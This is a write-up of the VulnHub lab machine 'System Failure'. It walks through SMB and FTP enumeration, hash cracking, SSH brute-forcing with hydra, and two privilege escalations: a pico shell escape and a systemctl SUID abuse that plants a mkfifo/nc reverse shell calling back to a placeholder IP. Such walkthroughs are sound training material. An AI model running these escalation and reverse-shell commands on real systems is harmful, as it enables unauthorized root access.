# System Failure - VulnHub Machine Writeup

## Nmap Scan
The initial scan with `nmap` revealed the following open ports:
- FTP
- SSH
- HTTP
- SMB

This indicated multiple services for further enumeration.

![Nmap Scan Results](https://github.com/sagar-sehrawat/VulnHub-Machine-Solutions/blob/main/System%20Failure/img/img1.png)

---

## Enum4Linux Enumeration
Using `enum4linux`, I identified four users:
- `admin`
- `superadmin`
- `jin`
- `valex`

Additionally, there were some SMB shares, including an `anonymous` share.

![Enum4Linux Results - Part 1](https://github.com/sagar-sehrawat/VulnHub-Machine-Solutions/blob/main/System%20Failure/img/img2.png)

![Enum4Linux Results - Part 2](https://github.com/sagar-sehrawat/VulnHub-Machine-Solutions/blob/main/System%20Failure/img/img3.png)

---

## Accessing the Anonymous SMB Share
I accessed the `anonymous` SMB share and downloaded a file. It contained some information and a password for FTP. Initially, I thought it was hexadecimal, but it turned out to be an NTLM hash. I cracked the hash using [CrackStation](https://crackstation.net).

![SMB File Details](https://github.com/sagar-sehrawat/VulnHub-Machine-Solutions/blob/main/System%20Failure/img/img4.png)

![CrackStation Results](https://github.com/sagar-sehrawat/VulnHub-Machine-Solutions/blob/main/System%20Failure/img/img5.png)

---

## FTP Access and File Enumeration
Using the cracked FTP credentials, I accessed the server and discovered some files. One folder contained nearly 1000 files, but one file stood out due to its size. I downloaded it and found a passage along with a `here.txt` file.

![FTP Access](https://github.com/sagar-sehrawat/VulnHub-Machine-Solutions/blob/main/System%20Failure/img/img6.png)

![File Inspection - Passage](https://github.com/sagar-sehrawat/VulnHub-Machine-Solutions/blob/main/System%20Failure/img/img7.png)

![File Inspection - here.txt](https://github.com/sagar-sehrawat/VulnHub-Machine-Solutions/blob/main/System%20Failure/img/img8.png)

---

## Decoding Base62 and Web Directory Enumeration
The passage contained a string `J310MIYla1aVUaSV`, which I decoded from Base62 to discover a web directory path. Brute-forcing revealed a directory named `area4`. Inside, I found a `useful.txt` wordlist, likely containing SSH passwords.

![Web Enumeration](https://github.com/sagar-sehrawat/VulnHub-Machine-Solutions/blob/main/System%20Failure/img/img9.png)

---

## SSH Brute-Forcing
Using the wordlist and the known usernames, I brute-forced SSH with `hydra`. After experimenting with different arguments, I successfully found the password for the user `valex`.

![Hydra Brute-Force](https://github.com/sagar-sehrawat/VulnHub-Machine-Solutions/blob/main/System%20Failure/img/img10.png)

---

## Privilege Escalation to `jin`
After logging in as `valex`, I discovered that `valex` could execute `/usr/bin/pico` as `jin`. Using [GTFOBins](https://gtfobins.github.io/), I escalated to the `jin` user:

### Commands Used:
```bash
sudo -u jin /usr/bin/pico
```

In `nano`, I pressed `CTRL+R` and `CTRL+X` to access command execution, then ran:
```bash
reset; sh 1>&0 2>&0;
```

![Privilege Escalation to jin](https://github.com/sagar-sehrawat/VulnHub-Machine-Solutions/blob/main/System%20Failure/img/img11.png)

---

## Privilege Escalation to Root
As `jin`, I found the `systemctl` SUID binary. Referring to GTFOBins, I exploited it to gain root access:

### Commands Used:
```bash
TF=$(mktemp).service

cat << EOF > $TF
[Service]
Type=oneshot
ExecStart=/bin/sh -c "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <YOUR_IP> 4444 >/tmp/f"
[Install]
WantedBy=multi-user.target
EOF

/usr/bin/systemctl link $TF
/usr/bin/systemctl enable --now $TF
```

Start a Netcat listener before running the commands to catch the reverse shell.

![Root Shell Obtained](https://github.com/sagar-sehrawat/VulnHub-Machine-Solutions/blob/main/System%20Failure/img/img13.png)


**Author:** Sagar Sehrawat  
